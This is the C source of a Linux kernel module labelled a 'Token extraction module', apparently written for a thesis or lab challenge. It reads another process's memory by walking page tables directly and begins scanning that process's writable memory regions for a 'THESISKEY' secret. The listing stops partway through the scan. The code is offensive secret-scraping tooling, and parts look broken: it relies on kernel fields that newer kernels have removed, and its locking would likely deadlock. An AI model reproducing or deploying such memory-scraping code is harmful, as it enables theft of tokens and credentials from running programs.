#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>
#include <asm/pgtable.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("thesis");
MODULE_DESCRIPTION("Token extraction module");

static struct proc_dir_entry *proc_parent;

/* Helper to read memory from a task */
static int read_process_memory(struct task_struct *task, unsigned long addr, char *buf, size_t len) {
    struct mm_struct *mm = task->mm;
    if (!mm) {
        printk(KERN_INFO "No mm_struct\n");
        return -1;
    }

    struct vm_area_struct *vma;
    int copied = 0;

    down_read(&mm->mmap_lock);

    for (vma = mm->mmap; vma && copied < len; vma = vma->vm_next) {
        if (addr >= vma->vm_start && addr < vma->vm_end) {
            unsigned long offset = addr - vma->vm_start;
            unsigned long to_read = min(len - copied, vma->vm_end - addr);

            if (!(vma->vm_flags & VM_READ)) {
                up_read(&mm->mmap_lock);
                return -1;
            }

            unsigned long page_addr = vma->vm_start + offset;
            size_t remaining = to_read;

            while (remaining > 0 && page_addr < vma->vm_end) {
                struct page *page;
                pte_t *pte;

                /* Simple page lookup */
                unsigned long pfn = 0;
                pgd_t *pgd = pgd_offset(mm, page_addr);
                if (pgd_none(*pgd)) {
                    page_addr += PAGE_SIZE;
                    continue;
                }

                p4d_t *p4d = p4d_offset(pgd, page_addr);
                if (p4d_none(*p4d)) {
                    page_addr += PAGE_SIZE;
                    continue;
                }

                pud_t *pud = pud_offset(p4d, page_addr);
                if (pud_none(*pud)) {
                    page_addr += PAGE_SIZE;
                    continue;
                }

                pmd_t *pmd = pmd_offset(pud, page_addr);
                if (pmd_none(*pmd)) {
                    page_addr += PAGE_SIZE;
                    continue;
                }

                pte = pte_offset_map(pmd, page_addr);
                if (!pte || pte_none(*pte)) {
                    if (pte) pte_unmap(pte);
                    page_addr += PAGE_SIZE;
                    continue;
                }

                page = pte_page(*pte);
                pte_unmap(pte);

                if (!page) {
                    page_addr += PAGE_SIZE;
                    continue;
                }

                void *kaddr = kmap(page);
                unsigned long in_page_offset = page_addr & ~PAGE_MASK;
                unsigned long to_copy = min(remaining, PAGE_SIZE - in_page_offset);

                memcpy(buf + copied, (char *)kaddr + in_page_offset, to_copy);
                kunmap(page);

                copied += to_copy;
                remaining -= to_copy;
                page_addr += to_copy;
            }
            break;
        }
    }

    up_read(&mm->mmap_lock);
    return copied;
}

/* Scan process heap for THESISKEY pattern */
static int find_and_read_token(struct task_struct *task, char *output, size_t out_len) {
    struct mm_struct *mm = task->mm;
    if (!mm) return 0;

    struct vm_area_struct *vma;
    char *search_buf = vmalloc(4096);
    if (!search_buf) return 0;

    down_read(&mm->mmap_lock);

    for (vma = mm->mmap; vma; vma = vma->vm_next) {
        /* Search heap and data segments */
        if (!(vma->vm_flags & VM_READ)) continue;
        if (!(vma->vm_flags & (VM_WRITE | VM_EXEC))) continue;

        /* Scan this vma */
        unsigned long addr = vma->vm_start;
        while (addr < vma->vm_end) {
            unsigned long to_read = min(4096UL, vma->vm_end - addr);
            unsigned long page_addr = addr;
            int read = 0;

            /* Read page */
